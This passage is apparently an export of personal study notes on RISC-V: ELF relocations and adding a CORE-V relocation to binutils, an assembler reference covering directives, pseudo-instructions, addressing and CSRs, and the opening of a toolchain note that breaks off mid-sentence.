Relocation Types\n`r_info` of `Elfxx_Rela` and `Elfxx_Rel` contains two encoded values, which are the **symbol index** where the relocation is being applied to and the **relocation type** to apply. \n\n## RISC-V Relocations\nCan be found [here](https://github.com/riscv-non-isa/riscv-elf-psabi-doc/blob/master/riscv-elf.adoc).\n\n### Implementation (Practical)\n#### Important Commands\n```bash\nriscv32-unknown-elf-as -march=rv32i -o \u003cfile\u003e.o \u003cfile\u003e.s\nriscv32-unknown-elf-gcc -march=rv32i -Os -c \u003cnewfile\u003e.c\nriscv32-unknown-elf-gcc -o \u003cnewfile\u003e.c \u003cnewfile\u003e.o \u003cfile\u003e.o\n```\n\n- `-c` stops the compiler before link time, the third command links the object files together.\n\n#### Where are the relocations?\nThey can be found in:\n\n```bash\nbfd/elfxx-riscv.c # -\u003e describes the relocation in the howto table\nbfd/elfnn-riscv.c # -\u003e add relocation mask \nbfd/reloc.c # -\u003e add the relocation BFD name\ninclude/elf/riscv.h # -\u003e add the relocation number\ngas/config/tc-riscv.c # -\u003e where the magic happens\n```\n\nIf we use the CORE-V relocations as an example, we have `BFD_RELOC_RISCV_CVPCREL_UI12`, which is a 12-bit relocation for 12-bit immediates found in `cv.starti` and `cv.endi`. Its relocation number is 224.\n\nYou can find the [**howto** table](notes/general/howto-table.md) in `bfd/elfxx-riscv.c` which contains entries for each relocation. The first field uses the table from `include/elf/riscv.h`.\n\n#### Howto Table (notes on how CORE-V relocation was implemented)\n**Step 1:** Check that symbol address exists via _fixP→fx_addsy_. If false the case will just break and not go through the following steps.\n\n**Step 2:** Uses the howto table to look up the relocation. The howto table can be found in _**bfd/elfxx-riscv.c**_. The first field uses the table from _**include/elf/riscv.h**_.\n\n**Step 3:** Set the _delta_ and _target_ values to increase objdump readability.\n\nTarget is the value of the symbol found using _S_GET_VALUE_. Since the symbol is local, it will use _resolve_symbol_value_ to find the value. This is called during the final pass over the symbol table to resolve any symbols with complex values.\n\nDelta is the PC relative value found via “_target - md_pcrel_from (fixP)”_, where fixP is the symbol.\n\n**Step 4:** Check if the relocation overflows. _bfd_check_overflow_ will return _bfd_reloc_ok_ or _bfd_reloc_overflow_. If overflow, _as_fatal_ will be used, ending the assembly.\n\n```\nbfd_reloc_status_type bfd_check_overflow\n    (enum complain_overflow how, // howto-\u003ecomplain_on_overflow\n    unsigned int bitsize, // Relocation has bitsize significant bits\n    unsigned int rightshift, // This relocation requires right shift by 1 (common)\n    unsigned int addrsize, // Machine has addrsize significant bits\n    bfd_vma relocation); // The relocation found in the howto table\n```\n\n**Step 5:** Remove some of the information from the header records of object files using _bfd_putl32_. The function masks to remove the information.\n\n```\nvoid\nbfd_putl32 (bfd_vma data, void *p) {\n    bfd_byte *addr = (bfd_byte *) p;\n    \n    addr[0] = data \u0026 0xff;\n    addr[1] = (data \u003e\u003e 8) \u0026 0xff;\n    addr[2] = (data \u003e\u003e 16) \u0026 0xff;\n    addr[3] = (data \u003e\u003e 24) \u0026 0xff;\n}\n```\n\n---\n## References\n- https://www.intezer.com/blog/malware-analysis/executable-and-linkable-format-101-part-3-relocations/\n- https://github.com/riscv-non-isa/riscv-elf-psabi-doc/blob/master/riscv-elf.adoc#reloc-table\n- https://www.intezer.com/blog/malware-analysis/executable-linkable-format-101-part-4-dynamic-linking/\n- https://man7.org/linux/man-pages/man8/ld.so.8.html\n- https://codywu2010.wordpress.com/2014/11/29/about-elf-pie-pic-and-else/\n- http://bottomupcs.sourceforge.net/csbu/x3824.htm\n- https://www.sifive.com/blog/all-aboard-part-2-relocations\n\n## Related Notes\n- [Linker](notes/general/linker.md)\n- [Howto Table](notes/general/howto-table.md)\n- [PLT and GOT](notes/general/plt-and-got.md)\n- [Linker Relaxation](notes/general/linker-relaxation.md)\n- [Jump Table](notes/general/jump-table.md)\n- [Assembler](notes/general/riscv-assembler-reference.md)",
    "lastmodified": "2022-11-24T12:21:00.953285336Z",
    "tags": null
  },
  "/notes/general/riscv": {
    "title": "RISC-V",
    "content": "# RISC-V\n---\n- [Introduction to RISC-V](notes/general/introduction-to-riscv.md)\n- [RISC-V Assembler Reference](notes/general/riscv-assembler-reference.md)\n\n## Instruction Set\n![riscv-cheatsheet-is](notes/images/riscv-cheatsheet-is.png)\n\n![](https://miro.medium.com/proxy/1*AQgZssKpktAWuAYIAYecqA.png)\n\n## Reference\n- RISC-V IS Cheatsheet ([here](https://itnext.io/risc-v-instruction-set-cheatsheet-70961b4bbe8))\n- RISC-V ASM Cheatsheet ([here](https://michaeljclark.github.io/asm.html))\n- RISC-V Assembly for Beginners ([here](https://medium.com/swlh/risc-v-assembly-for-beginners-387c6cd02c49))\n- RISC-V Assembly Code Examples ([here](https://erik-engheim.medium.com/risc-v-assembly-code-examples-7bca0e7ebaa3))",
    "lastmodified": "2022-11-24T12:21:01.209695339Z",
    "tags": null
  },
  "/notes/general/riscv-assembler-reference": {
    "title": "RISC-V Assembler Reference",
    "content": "# RISC-V Assembler Reference\n---\n```toc\n```\n\nThis document gives an overview of RISC-V assembly language. First, an introduction to assembler and linker concepts, then sections describing assembler directives, pseudo- instructions, relocation functions, and assembler concepts such as labels, relative and absolute addressing, immediate values, constants and finally control and status registers.\n\nThe accompanying [RISC-V Instruction Set Reference](https://michaeljclark.github.io/isa) contains a listing of instruction in the `I` _(Base Integer Instruction Set)_ and `M` _(Multiply and Divide)_ extension. For detailed information on the RISC-V instruction set refer to the [RISC-V ISA Specification](http://riscv.org/specifications/).\n\n## Concepts\nThis section briefly covers some high level concepts that are required to understand the process of assembling and linking executable code from source files.\n\n### Assembly file\nAn assembly file contains assembly language directives, macros and instructions. It can be emitted by a compiler or it can be handwritten. An assembly file is the input file to the assembler. The standard extensions for assembly files are `.s` and `.S`, with the later indicating that the assembly file should be pre-processed using the C preprocessor.\n\n### Relocatable Object file\nA relocatable object file contains compiled object code and data emitted by the assembler. An object file cannot be run, rather it is used as input to the linker. The standard extension for object files is `.o`. The most common cross-platform file format for RISC-V executables is the ELF _(Electronic Linker Format)_ object file format. The `objdump` utility can be used to disassemble an object file, `objcopy` can be used to copy and extract sections from ELF files and the `nm` utility can list symbols in an object file.\n\nAn ELF file has an ELF header that contains _magic_ to indicate the file is ELF formatted, the architecture of the binary, the endianness of the binary _(little-endian for RISC-V)_, the ELF file type _(Relocatable Object File, Executable File, Shared Library)_, the number of program headers and their offset in the file, the number of section headers and their offset in the file, fields indicating the ELF version and ABI _(Application Binary Interface)_ version of the file and finally flags indicating various ABI options such as RVC compression and which floating- point ABI that the executable code in the binary conforms to.\n\nProgram Headers provide size and offsets of loadable segments within an executable file or shared object along with protection attributes used by the operating system _(read, write and exec)_. Program headers are not present in relocatable object files and are primarily for use by the operating system to and dynamic linker to map code and data into memory.\n\nSection Headers provide size, offset, type, alignment and flags of the sections contained within the ELF file. Section headers are not required to execute a static binary but are necessary for dynamic linking as well as program linking. Various section types refer to the location of the symbol table, relocations and dynamic symbols in the ELF binary file.\n\n### Sections\nAn object file is made up of multiple sections, with each section corresponding to distinct types of executable code or data. There are a variety of different section types. This list shows the four most common sections:\n\n-   `.text` is a read-only section containing executable code\n-   `.data` is a read-write section containing global or static variables\n-   `.rodata` is a read-only section containing const variables\n-   `.bss` is a read-write section containing uninitialised data\n\n### Program linking\nProgram linking is the process of reading multiple relocatable object files, merging the sections from each of the source files, calculating the new addresses for symbols and applying relocation [fixups](notes/general/fixups.md) to text or data that is pointed to in relocation entries.\n\n### Linker Script\nA linker script is a text source file that is optionally input to the linker and it contains rules for the linker to use when calculating the load address and alignment of the various sections when creating an executable output file. The standard extension for linker scripts is `.ld`.\n\n### Assembler Directives\nThe assembler implements a number of directives that control the assembly of instructions into an object file. These directives give the ability to include arbitrary data in the object file, control exporting of symbols, selection of sections, alignment of data, assembly options for compression, position dependent and position independent code.\n\nThe following are assembler directives for emitting data:\n\n| Directive | Arguments | Description |\n| --- | --- | --- |\n| `.2byte` |   | 16-bit comma separated words (unaligned) |\n| `.4byte` |   | 32-bit comma separated words (unaligned) |\n| `.8byte` |   | 64-bit comma separated words (unaligned) |\n| `.half` |   | 16-bit comma separated words (naturally aligned) |\n| `.word` |   | 32-bit comma separated words (naturally aligned) |\n| `.dword` |   | 64-bit comma separated words (naturally aligned) |\n| `.byte` |   | 8-bit comma separated words |\n| `.dtpreldword` |   | 64-bit thread local word |\n| `.dtprelword` |   | 32-bit thread local word |\n| `.sleb128` | expression | signed little endian base 128, DWARF |\n| `.uleb128` | expression | unsigned little endian base 128, DWARF |\n| `.asciz` | “string” | emit string (alias for .string) |\n| `.string` | “string” | emit string |\n| `.incbin` | “filename” | emit the included file as a binary sequence of octets |\n| `.zero` | integer | zero bytes |\n\nThe following are assembler directives for control of alignment:\n\n| Directive | Arguments | Description |\n| --- | --- | --- |\n| `.align` | integer | align to power of 2 (alias for .p2align) |\n| `.balign` | b,\\[pad\\_val=0\\] | byte align |\n| `.p2align` | p2,\\[pad\\_val=0\\],max | align to power of 2 |\n\nThe following are assembler directives for definition and exporing of symbols:\n\n| Directive | Arguments | Description |\n| --- | --- | --- |\n| `.globl` | symbol\\_name | emit symbol\\_name to symbol table (scope GLOBAL) |\n| `.local` | symbol\\_name | emit symbol\\_name to symbol table (scope LOCAL) |\n| `.equ` | name, value | constant definition |\n\nThe following directives are for selection of sections:\n\n| Directive | Arguments | Description |\n| --- | --- | --- |\n| `.text` |   | emit .text section (if not present) and make current |\n| `.data` |   | emit .data section (if not present) and make current |\n| `.rodata` |   | emit .rodata section (if not present) and make current |\n| `.bss` |   | emit .bss section (if not present) and make current |\n| `.comm` | symbol\\_name,size,align | emit common object to .bss section |\n| `.common` | symbol\\_name,size,align | emit common object to .bss section |\n| `.section` | \\[{.text,.data,.rodata,.bss}\\] | emit section (if not present, default .text) and make current |\n\nThe following directives includes options, macros and other miscellaneous functions:\n\n| Directive | Arguments | Description |\n| --- | --- | --- |\n| `.option` | {rvc,norvc,pic,nopic,push,pop} | RISC-V options |\n| `.macro` | name arg1 \\[, argn\\] | begin macro definition \\\\argname to substitute |\n| `.endm` |   | end macro definition |\n| `.file` | “filename” | emit filename FILE LOCAL symbol table |\n| `.ident` | “string” | accepted for source compatibility |\n| `.size` | symbol, symbol | accepted for source compatibility |\n| `.type` | symbol, @function | accepted for source compatibility |\n\n### Assembler Pseudo-instructions\nThe assembler implements a number of convenience pseudo-instructions that are formed from instructions in the base ISA, but have implicit arguments or in some case reversed arguments, that result in distinct semantics.\n\nThe following table lists RISC-V assembler pseudo instructions:\n\n| Pesudo-instruction | Expansion | Description |\n| --- | --- | --- |\n| `nop` | `addi zero,zero,0` | No operation |\n| `li rd, expression` | (several expansions) | Load immediate |\n| `la rd, symbol` | (several expansions) | Load address |\n| `mv rd, rs1` | `addi rd, rs, 0` | Copy register |\n| `not rd, rs1` | `xori rd, rs, -1` | One’s complement |\n| `neg rd, rs1` | `sub rd, x0, rs` | Two’s complement |\n| `negw rd, rs1` | `subw rd, x0, rs` | Two’s complement Word |\n| `sext.w rd, rs1` | `addiw rd, rs, 0` | Sign extend Word |\n| `seqz rd, rs1` | `sltiu rd, rs, 1` | Set if = zero |\n| `snez rd, rs1` | `sltu rd, x0, rs` | Set if ≠ zero |\n| `sltz rd, rs1` | `slt rd, rs, x0` | Set if \u003c zero |\n| `sgtz rd, rs1` | `slt rd, x0, rs` | Set if \u003e zero |\n| `fmv.s frd, frs1` | `fsgnj.s frd, frs, frs` | Single-precision move |\n| `fabs.s frd, frs1` | `fsgnjx.s frd, frs, frs` | Single-precision absolute value |\n| `fneg.s frd, frs1` | `fsgnjn.s frd, frs, frs` | Single-precision negate |\n| `fmv.d frd, frs1` | `fsgnj.d frd, frs, frs` | Double-precision move |\n| `fabs.d frd, frs1` | `fsgnjx.d frd, frs, frs` | Double-precision absolute value |\n| `fneg.d frd, frs1` | `fsgnjn.d frd, frs, frs` | Double-precision negate |\n| `beqz rs1, offset` | `beq rs, x0, offset` | Branch if = zero |\n| `bnez rs1, offset` | `bne rs, x0, offset` | Branch if ≠ zero |\n| `blez rs1, offset` | `bge x0, rs, offset` | Branch if ≤ zero |\n| `bgez rs1, offset` | `bge rs, x0, offset` | Branch if ≥ zero |\n| `bltz rs1, offset` | `blt rs, x0, offset` | Branch if \u003c zero |\n| `bgtz rs1, offset` | `blt x0, rs, offset` | Branch if \u003e zero |\n| `bgt rs, rt, offset` | `blt rt, rs, offset` | Branch if \u003e |\n| `ble rs, rt, offset` | `bge rt, rs, offset` | Branch if ≤ |\n| `bgtu rs, rt, offset` | `bltu rt, rs, offset` | Branch if \u003e, unsigned |\n| `bleu rs, rt, offset` | `bltu rt, rs, offset` | Branch if ≤, unsigned |\n| `j offset` | `jal x0, offset` | Jump |\n| `jr offset` | `jal x1, offset` | Jump register |\n| `ret` | `jalr x0, x1, 0` | Return from subroutine |\n\n### Relocation Functions\nThe relocation function directives create synthesise operand values that are resolved at program link time and are used as immediate parameters to specific instructions. The sections on absolute and relative addressing give examples of using the relocation functions.\n\nThe following table lists assembler functions used to generate relocations:\n\n| Assembler Notation | Description | Instructions |\n| --- | --- | --- |\n| `%hi(symbol)` | Absolute (HI20) | lui |\n| `%lo(symbol)` | Absolute (LO12) | loads, stores, adds |\n| `%pcrel_hi(symbol)` | PC-relative (HI20) | auipc |\n| `%pcrel_lo(label)` | PC-relative (LO12) | loads, stores, adds |\n| `%tprel_hi(symbol)` | TLS LE (Local Exec) | auipc |\n| `%tprel_lo(label)` | TLS LE (Local Exec) | loads, stores, adds |\n| `%tprel_add(offset)` | TLS LE (Local Exec) | add |\n\n### Labels\nText labels are used as branch, unconditional jump targets and symbol offsets. Text labels are added to the symbol table of the compiled module.\n\nNumeric labels are used for local references. References to local labels are suffixed with ‘f’ for a forward reference or ‘b’ for a backwards reference.\n\n### Absolute Addressing\nAbsolute addresses are used in position dependent code. An absolute address is formed using two instructions, the U-Type `lui` _(Load Upper Immediate)_ instruction to load `bits[31:20]` and an I-Type or S-Type instruction such as `addi` _(add immediate)_, `lw` _(load word)_ or `sw` _(store word)_ that fills in the low 12 bits relative to the upper immediate.\n\nThe following example shows how to load an absolute address:\n\n```\n.section .text\n.globl _start\n_start:\n    lui  a1,      %hi(msg)       # load msg(hi)\n    addi a1, a1,  %lo(msg)       # load msg(lo)\n    jalr ra, puts\n2:    j    2b\n\n.section .rodata\nmsg:\n    .string \"Hello World\\n\"\n```\n\nwhich generates the following assembler output and relocations as seen by objdump:\n\n```\n0000000000000000 \u003c_start\u003e:\n   0:000005b7          luia1,0x0\n0: R_RISCV_HI20msg\n   4:00858593          addia1,a1,8 # 8 \u003c.L21\u003e\n4: R_RISCV_LO12_Imsg\n```\n\n### Relative Addressing\nRelative addresses are used in position independent code. A PC-relative address is formed using two instructions, the U-Type `auipc` _(Add Upper Immediate Program Counter)_ instruction to load `bits[31:20]` relative to the program counter of the `auipc` instruction followed by an I-Type or S-Type instruction such as `addi` _(add immediate)_, `lw` _(load word)_ or `sw` _(store word)_.\n\nThe following example shows how to load a PC-relative address:\n\n```\n.section .text\n.globl _start\n_start:\n1:    auipc a1,     %pcrel_hi(msg) # load msg(hi)\n    addi  a1, a1, %pcrel_lo(1b)  # load msg(lo)\n    jalr  ra, puts\n2:    j     2b\n\n.section .rodata\nmsg:\n    .string \"Hello World\\n\"\n```\n\nwhich generates the following assembler output and relocations as seen by objdump:\n\n```\n0000000000000000 \u003c_start\u003e:\n   0:00000597          auipca1,0x0\n0: R_RISCV_PCREL_HI20msg\n   4:00858593          addia1,a1,8 # 8 \u003c.L21\u003e\n4: R_RISCV_PCREL_LO12_I.L11\n```\n\n### Constants\nConstants are emitted to the symbol table of the object but they do not take any space in the code or data sections. Constants can be referenced in expressions which emit relocations.\n\nThe following example shows loading a constant using the `%hi` and `%lo` assembler functions.\n\n```\n.equ UART_BASE, 0x40003000\n\n        lui a0,      %hi(UART_BASE)\n        addi a0, a0, %lo(UART_BASE)\n```\n\nThis example uses the `li` pseudo instruction to load a constant and writes a string using polled IO to a UART:\n\n```\n.equ UART_BASE,  0x40003000\n.equ REG_RBR,    0\n.equ REG_TBR,    0\n.equ REG_IIR,    2\n.equ IIR_TX_RDY, 2\n.equ IIR_RX_RDY, 4\n\n.section .text\n.globl _start\n_start:\n1:      auipc a0, %pcrel_hi(msg)    # load msg(hi)\n        addi  a0, a0, %pcrel_lo(1b)  # load msg(lo)\n2:      jal   ra, puts\n3:      j     3b\n\nputs:\n        li    a2, UART_BASE\n1:      lbu   a1, (a0)\n        beqz  a1, 3f\n2:      lbu   a3, REG_IIR(a2)\n        andi  a3, a3, IIR_TX_RDY\n        beqz  a3, 2b\n        sb    a1, REG_TBR(a2)\n        addi  a0, a0, 1\n        j     1b\n3:      ret\n\n.section .rodata\nmsg:\n    .string \"Hello World\\n\"\n```\n\n### Control and Status Registers\nControl and status registers are typically used to update privileged processor state however there are a few non-privileged instructions that access control and status registers such as the CSR pseudo-instructions `rdcycle`, `rdtime`, `rdinstret` for access to counters and `frcsr`, `frrm`, `frflags`, `fscsr`, `fsrm`, `fsflags`, `fsrmi` and `fsflagsi` for controling round mode and accessing floating point accrued exception state.\n\nThe following instructions allow reading, writing, setting and clearing bits in CSRs _(control and status registers)_:\n\n| CSR Operation | Description |\n| --- | --- |\n| `CSRRW rd, csr, rs1` | Control and Status Register Atomic Read and Write |\n| `CSRRS rd, csr, rs1` | Control and Status Register Atomic Read and Set Bits |\n| `CSRRC rd, csr, rs1` | Control and Status Register Atomic Read and Clear Bits |\n| `CSRRWI rd, csr, imm5` | Control and Status Register Atomic Read and Write Immediate |\n| `CSRRSI rd, csr, imm5` | Control and Status Register Atomic Read and Set Bits Immediate |\n| `CSRRCI rd, csr, imm5` | Control and Status Register Atomic Read and Write Immediate |\n\nThe following code sample shows how to enable interrupts, enable timer interrupts, and then set and wait for a timer interrupt to occur. The example uses CSR instructions and access to a platform specific MMIO _(memory mapped input output)_ region:\n\n```\n.equ RTC_BASE,      0x40000000\n.equ TIMER_BASE,    0x40004000\n\n# setup machine trap vector\n1:      auipc   t0, %pcrel_hi(mtvec)        # load mtvec(hi)\n        addi    t0, t0, %pcrel_lo(1b)       # load mtvec(lo)\n        csrrw   zero, mtvec, t0\n\n# set mstatus.MIE=1 (enable M mode interrupt)\n        li      t0, 8\n        csrrs   zero, mstatus, t0\n\n# set mie.MTIE=1 (enable M mode timer interrupts)\n        li      t0, 128\n        csrrs   zero, mie, t0\n\n# read from mtime\n        li      a0, RTC_BASE\n        ld      a1, 0(a0)\n\n# write to mtimecmp\n        li      a0, TIMER_BASE\n        li      t0, 1000000000\n        add     a1, a1, t0\n        sd      a1, 0(a0)\n\n# loop\nloop:\n        wfi\n        j loop\n\n# break on interrupt\nmtvec:\n        csrrc   t0, mcause, zero\n        bgez    t0, fail       # interrupt causes are less than zero\n        slli    t0, t0, 1      # shift off high bit\n        srli    t0, t0, 1\n        li      t1, 7          # check this is an m_timer interrupt\n        bne t0, t1, fail\n        j pass\n\npass:\n        la      a0, pass_msg\n        jal     puts\n        j       shutdown\n\nfail:\n        la      a0, fail_msg\n        jal     puts\n        j       shutdown\n\n.section .rodata\n\npass_msg:\n        .string \"PASS\\n\"\n\nfail_msg:\n        .string \"FAIL\\n\"\n```\n\n### Addresses, Jumps and Labels\nFor a RISC-V program we know every instruction takes 32-bits. That corresponds to 4 bytes. Thus in a program the first instruction will typically be at address 0, the second at 4, the third at 8 and so on.\n\nLet us write out an earlier program with addresses in the first column to make it easier to see how jumps work. First let us clarify a jump or branch is. If you want to repeat part of your code several times over you need to make a jump to a previous instruction.\n\nThe microprocessor keeps track of the next instruction to execute with a special register called the _Program Counter (PC)_. It gives the address in bytes of the next instruction to execute. Since each instruction is 4 bytes long, the PC gets incremented by 4 each time.\n\nLet us look at an example:\n\n```as\nBEQ x2, x4, 12\n```\n\nThe `BEQ` instruction means branch or jump if registers are **EQ**ual. If `x2 = x4` then the program counter (PC) will be updated to:\n\n```as\nPC ← PC + 12\n```\nThat means jumping 3 instructions forward. That means we skip the next two instructions. Let us look at the count down program from earlier. The first column contains the instruction address:\n\n```as\n00:  ADDI x2, zero, 1   # x2 ← 0  + 1     \n04:  SUB x1, x1, x2     # x1 ← x1 - 1  \n08:  SW  x1, 4(zero)    # x1 → [4 + 0]  \n12:  BLT zero, x1, -8   # 0 \u003c x1 =\u003e PC ← PC - 8 = 4  \n16:  HLT                # Halt, stop execution\n```\n\nYou can copy this to the simulator without the address column. What you see here is that branching is relative to where you are. On line `12`, we want to check if `x1` is still larger than zero to see if we should continue our countdown. If it is we want to jump to line `04` where we use `SUB` to subtract 1 from `x1`. However we don't write `BLT zero, x1, 4`. Instead we specify `-8`. That is because jumps are relative. We jump two instructions backwards.\n\nThis is in fact quite practical because it means we could move our program to a different location in memory and it would still work. However more importantly it saves a lot of space. You only got 32-bits to encode an instruction:\n\n-   Each register requires 5 bits to encode and the branch specifies two registers which eats up 10-bits.\n-   The opcode and function eat up 10-bits.\n-   That leaves 12-bits to specify an address to jump to. The maximum number you get with 12-bits is 4096 (²¹²). Thus if your program was larger than 4 KB you couldn’t perform jumps.\n\nWith relative addressing this is not a problem. You can jump 2048 bytes backwards or forwards in the program. Most for-loops, while-loop and if-statement will not be larger than that.\n\nHowever there is one problem with relative addressing. It is awkward for the programmer to write. This is where address labels save us:\n\n```as\nADDI x2, x0, 1  \n  \nloop:  \n   SUB x1, x1, x2  \n   SW  x1, 4(x0)   \n   BLT x0, x1, loop\n```\n\nYou can simply label the location you want to jump. Here we use the label `loop`. Use a colon to indicate this is a label. The assembler will use the label to calculate what offset needs to be used to jump to the given label. Thus depending on what instruction is using the `loop` label, a different offset will be calculated.\n\nOk let us look at different types of jumps. An instruction which makes an unconditional jump start with a `J`. Jumps which are conditional start with a `B` for Branch.\n\n## Instructions\n### Branching — Conditional Jumps\nFor conditional branching we compose the mnemonic from a `B` and a two or three letter combination describing the condition such as:\n\n-   `EQ` = **EQ**ual.\n-   `NE` ≠ **N**ot **E**qual.\n-   `LT` \u003c **L**ess **T**han.\n-   `GE` ≥ **G**reater or **E**qual.\n\nLet us look at a few examples of what that would translate to:\n\n```as\nBEQ x2, x4, offset    # x2 = x4  =\u003e PC ← PC + offset  \nBNE x2, x4, offset    # x2 ≠ x4  =\u003e PC ← PC + offset  \nBLT x2, x4, offset    # x2 \u003c x4  =\u003e PC ← PC + offset  \nBGE x2, x4, offset    # x2 ≥ x4  =\u003e PC ← PC + offset\n```\n\n### Unconditional Jumps\nOften we need to jump around in code without checking if a condition is true or false. Examples of this are:\n\n-   Calling a function. That means setting `a` registers to function inputs and doing a unconditional jump to location in memory where instructions for function reside.\n-   Returning from a function. When we are done executing code in a function we need to return to instruction after call-site.\n\nBut often you simply need to make unconditional jumps to deal with different conditions.\n\n### Jump and Link — JAL\nThe `JAL` instruction can be used for both calling functions or just make a simple unconditional jump.\n\n`JAL` makes a relative jump (relative to PC) just like the conditional branch instructions. However the provided register argument is not used for comparisons but to store return address. If you don't want to store the return address you can simply provide the `zero` register `x0`.\n\n```as\nJAL rd, offset    # rd ← PC + 4, PC ← PC + offset\n```\n\nThe convention used with RISC-V is that the return address should be stored with the return address register `ra` which is `x1`. Say you got some C code with call like this:\n\n```c\nfoobar(2, 3)\n```\n\nIn assembly this would be:\n\n```as\nADDI a0, zero, 2  \nADDI a1, zero, 3  \nJAL  ra, foobar\n```\n\nWhy the emphasis on relative jumps in RISC-V? In earlier CPUs jumps where typically to absolute addresses. The reason is that in modern operating systems, one needs to be able to move code around in memory. Thus a developer cannot know the position of his or her code in memory. A relative jump will always work, regardless of where in memory a program is placed.\n\n### Jump and Link Register — JALR\nThis is really the same instruction but with the difference that we use an offset from register? What is the point of that?\n\nIn `JAL` there is simply not enough space to encode a full 32-bit address. That means you cannot jump anywhere in the code if you are in a larger program. But if you use an address contained in a register, you can jump to any address.\n\nOther than that `JALR` works almost the same as `JAL`. It will also store the return address in `rd`.\n\n```as\nJALR rd, offset(rs1)    # rd ← PC + 4, PC ← rs1 + offset\n```\n\nA big difference is that `JALR` jumps are not relative to `PC`. Instead it is relative to `rs1` .\n\nWhile we could use a regular `ADDI` function to set the `rs1` register that is impractical. We want an address relative to the program counter (PC). Fortunately we have a special instruction `AUIPC` which stands for: Add Upper Immediate to PC.\n\n```as\nAUIPC rd, immediate    # rd ← PC + immediate[31:12] \u003c\u003c 12\n```\n\nThe explanation may be hard to read, but it basically just means that we store the upper 20-bits of the offset to some label in the upper 20-bits of the `rd` register.\n\nThe `JALR` offset can be 12-bits wide, so together (20 + 12 = 32) they make up a 32-bit address. `JAL` uses a 20-bit address, so if you need to call a function `foobar` further away than that we use a combination of `AUIPC` and `JALR` like this:\n\n```as\nADDI   a0, zero, 2       # Set first argument to function  \nADDI   a1, zero, 3       # Set second argument.  \nAUIPC  t0, foobar        # Store upper 20-bits address of foobar  \nJALR   ra, foobar(t0)    \n```\n\n### Load Immediate\nThe `li` _(load immediate)_ instruction is an assembler pseudo instruction that is used to synthesise constants. The `li` pseudo instruction will emit a sequence starting with `lui` followed by `addi` and `slli` _(shift left logical immediate)_ to construct constants by shifting and adding.\n\nThe following example shows the `li` pseudo instruction being used to load an immediate value:\n\n```\n.section .text\n.globl _start\n_start:\n\n.equ CONSTANT, 0xcafebabe\n\n        li a0, CONSTANT\n```\n\nwhich generates the following assembler output as seen by objdump:\n\n```\n0000000000000000 \u003c_start\u003e:\n   0:00032537          lui     a0,0x32\n   4:bfb50513          addi    a0,a0,-1029\n   8:00e51513          slli    a0,a0,0xe\n   c:abe50513          addi    a0,a0,-1346\n```\n\n### Load Address\nThe `la` _(load address)_ instruction is an assembler pseudo- instruction used to load the address of a symbol or label. The instruction can emit absolute or relative addresses depending on the `-fpic` or `-fno-pic` assembler command line options or an `.options pic` or `.options nopic` assembler directive. The pseudo-instruction emits a relocation so that the address of the symbol can be fixed up during program linking.\n\nThe following example uses the `la` pseudo instruction to load a symbol address:\n\n```\n.section .text\n.globl _start\n_start:\n\n        la a0, msg\n\n.section .rodata\nmsg:\n    .string \"Hello World\\n\"\n```\n\nwhich generates the following assembler output and relocations as seen by objdump:\n\n```\n0000000000000000 \u003c_start\u003e:\n   0:00000517          auipca0,0x0\n0: R_RISCV_PCREL_HI20msg\n   4:00850513          addia0,a0,8 # 8 \u003c_start+0x8\u003e\n4: R_RISCV_PCREL_LO12_I.L11\n```\n\n## Resources\n-   [Venus](https://www.kvakil.me/venus/) — This is a natural next step to learn RISC-V. This supports more instructions and assembly directives. Also runs in browser for easy startup.\n-   [RARS](https://github.com/TheThirdOne/rars) — A more complex environment but also with a lot more functionality. This is a Java app you got to download. But with this you can also simulate connections to different hardware such as keypads, seven-segment displays, bitmap displays etc. Lots of tools to analyze registers, memory, performance.\n-   [Ripes](https://github.com/mortbopet/Ripes) —An advanced Qt based GUI application for simulating RISC-V, and writing assembly code. This is a quite a lot more advanced. It shows a diagram of the CPU, where you can look at values flowing between different functional units at each clock cycle. Harder for beginners as you don’t really step one instruction at a time, but a clock cycle, and an instruction will take multiple clock cycles to complete. It also simulates a pipeline so that several instructions are in flight at once.\n-   [Assembly directives and instruction](https://michaeljclark.github.io/asm.html) — An overview by creator of the rv8 simulator which tells you want directives like `.text` `.data` means as well as pseudo instructions like `NOP`, `NOT`, `NEG` and `LI` means. Pseudo instruction are not actually defined in the ISA but shorthand for one or more common ISA instructions.\n\nIt is worth noting that a lot of these different assemblers use many of the same concepts and conventions. Many have e.g. an `ecall` instruction added which lets you call functions for printing out to console. Here are some examples of functions built into the Venus simulator: [Environmental Calls](https://github.com/kvakil/venus/wiki/Environmental-Calls).\n\nThere RISC-V tools for building executables which you can run in simulated environments but my focus in more on teaching and education rather than building any actual RISC-V systems so I will not focus on that here.\n\n### References\n-   [RISC-V Foundation](http://riscv.org/)\n-   [RISC-V ISA Specification](http://riscv.org/specifications/)\n-   [RISC-V GNU Toolchain](https://github.com/riscv/riscv-gnu-toolchain/)\n- [RISC-V Assembler Reference - Michael J Clark](https://michaeljclark.github.io/asm.html)",
    "lastmodified": "2022-11-24T12:21:01.119999886Z",
    "tags": null
  },
  "/notes/general/riscv-toolchain": {
    "title": "RISC-V Toolchain",
    "content": "# RISC-V Toolchain\n---\nThere are two RISC-V toolchains that are popularly used:\n\n1.  The GNU RISC-V toolchain\n2.  The LLVM RISC-V toolchain\n\nBoth toolchains provide a state-of-the-art optimising [compiler](notes/general/compilers.md), assembler, linker, and various other tools to build applications that run on RISC-V machines.\n\n## Where to download the toolchains and simulator\nThe official [RISC-V GitHub repository](https://github.com/riscv-collab/riscv-gcc) provides the source code for the `riscv-gnu` toolchain, and the prebuilt toolchain can be downloaded from [here](https://github.com/riscv-software-src/riscv-gnu-toolchain). \n\nThe RISC-V compiler is generally used as a cross-compiler, as many RISC-V processors are used for low-power embedded applications. Currently, the RISC-V cross-compilers can only be run on [ELF targets](https://en.wikipedia.org/wiki/Comparison_of_executable_file_formats) like Linux machines.\n\nThe RISC-V LLVM toolchain is not readily available from third-party providers, but one can build it from source by downloading the open source [llvm-project](https://github.com/llvm/llvm-project). We describe an easy way to use the llvm toolchain with gnu sysroot.\n\nThe RISC-V simulator can be downloaded from the official RISC-V GitHub repository: [riscv/riscv-isa-sim: Spike, a RISC-V ISA Simulator](https://github.com/riscv/riscv-isa-sim). Although RISC-V boards are readily available from several vendors, using simulators is an easy way to get started with RISC-V development.\n\n## Building Application with the Toolchain\nIn order to build a RISC-V application, using a [cross-compiler](notes/general/cross-compilation.md) toolchain is the same as any other cross-compiler-based development system. Two things are required:\n\n-   The [compiler toolchain](notes/general/compiler-toolchains.md)\n-   [sysroot](notes/general/sysroot.md)\n\nWe have described the compiler toolchain and sysroot in the first chapter. Before learning how to build applications with the RISC-V 